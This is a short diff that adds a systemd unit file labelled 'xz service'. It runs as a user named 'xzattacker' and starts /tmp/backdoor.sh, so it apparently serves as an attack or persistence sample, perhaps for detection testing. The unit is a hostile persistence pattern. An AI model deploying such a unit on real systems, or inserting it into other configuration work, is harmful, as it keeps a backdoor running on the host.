@@ -1,0 +1,8 @@
+[Unit]
+
+Description=xz service
+
+[Service]
+
+User=xzattacker
+ExecStart=/tmp/backdoor.sh
